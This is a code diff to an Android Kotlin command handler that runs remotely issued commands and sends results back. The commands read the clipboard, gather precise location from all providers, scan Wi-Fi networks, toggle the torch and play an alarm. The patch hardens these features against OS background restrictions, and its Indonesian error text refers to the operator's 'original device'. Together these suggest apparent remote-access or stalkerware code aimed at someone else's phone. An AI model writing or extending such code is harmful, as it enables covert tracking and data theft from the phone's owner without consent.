@@ -52,6 +52,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
 
     private var tts: TextToSpeech? = null
     private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+    private var isTorchOn = false
 
     init {
         tts = TextToSpeech(context, this)
@@ -150,8 +151,9 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     try {
                         val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                         val cameraId = camManager.cameraIdList[0] 
-                        val state = textArg.lowercase() == "on"
+                        val state = if (textArg.lowercase() == "on") true else if (textArg.lowercase() == "off") false else !isTorchOn
                         camManager.setTorchMode(cameraId, state)
+                        isTorchOn = state
                         sendResponse(createResponse(cmdId, "success", "Torch $state"))
                     } catch (e: Exception) {
                         sendResponse(createResponse(cmdId, "error", "Torch err: ${e.message}"))
@@ -198,12 +200,13 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                         if (cm.hasPrimaryClip() && cm.primaryClip != null && cm.primaryClip!!.itemCount > 0) {
                             val txt = cm.primaryClip!!.getItemAt(0).text.toString()
-                            sendResponse(createResponse(cmdId, "clipboard_content", txt))
+                            sendResponse(createResponse(cmdId, "clipboard", txt))
                         } else {
-                            sendResponse(createResponse(cmdId, "clipboard_content", "[Empty or Background Restricted]"))
+                            // Kebijakan Android 10+ FGS Background Restrict Clipboard
+                            sendResponse(createResponse(cmdId, "clipboard", "[Kosong atau Diblokir Kebijakan Background Android 10+]"))
                         }
                     } catch (e: Exception) {
-                        sendResponse(createResponse(cmdId, "error", "Clipboard access blocked by OS: ${e.message}"))
+                        sendResponse(createResponse(cmdId, "error", "Gagal baca clipboard: ${e.message}"))
                     }
                 }
 
@@ -211,8 +214,17 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                 "location" -> {
                     if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) || checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                         val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
-                        var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                        var loc: android.location.Location? = null
+                        val providers = lm.getProviders(true)
+                        
+                        for (provider in providers) {
+                            try {
+                                val l = lm.getLastKnownLocation(provider)
+                                if (l != null && (loc == null || l.accuracy < loc.accuracy)) {
+                                    loc = l
+                                }
+                            } catch (e: SecurityException) {}
+                        }
                         
                         if (loc != null) {
                             val obj = JSONObject().apply {
@@ -223,7 +235,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             }
                             sendResponse(createResponse(cmdId, "location_data", obj))
                         } else {
-                            sendResponse(createResponse(cmdId, "error", "Location unavailable or GPS off"))
+                            sendResponse(createResponse(cmdId, "error", "Lokasi belum Cache/GPS mati. Coba buka GMaps di device aslinya."))
                         }
                     } else {
                         sendResponse(createResponse(cmdId, "error", "Missing LOCATION permission"))
@@ -293,7 +305,8 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                 "wifi_scan" -> {
                     if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) && checkPerm(Manifest.permission.ACCESS_WIFI_STATE)) {
                         val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
-                        wm.startScan()
+                        try { wm.startScan() } catch (e: Exception) {}
+                        
                         val results = wm.scanResults
                         val arr = JSONArray()
                         for (res in results) {
@@ -303,6 +316,19 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             obj.put("level", res.level)
                             arr.put(obj)
                         }
+                        
+                        // Fallback ke connected wifi jika hasil list kosong pada FGS Android 14
+                        if (arr.length() == 0) {
+                            val currentWifi = wm.connectionInfo
+                            if (currentWifi != null && currentWifi.bssid != null) {
+                                val obj = JSONObject()
+                                obj.put("ssid", currentWifi.ssid)
+                                obj.put("bssid", currentWifi.bssid)
+                                obj.put("level", currentWifi.rssi)
+                                arr.put(obj)
+                            }
+                        }
+                        
                         sendResponse(createResponse(cmdId, "wifi_networks", arr))
                     } else {
                         sendResponse(createResponse(cmdId, "error", "Missing WIFI/LOC permissions"))
@@ -490,6 +516,13 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                          ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                         val ringtone = RingtoneManager.getRingtone(context, alarmUri)
+                        
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                            ringtone.audioAttributes = android.media.AudioAttributes.Builder()
+                                .setUsage(android.media.AudioAttributes.USAGE_ALARM)
+                                .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                                .build()
+                        }
                         ringtone.play()
                         
                         // Mainkan selama 10 detik lalu matikan
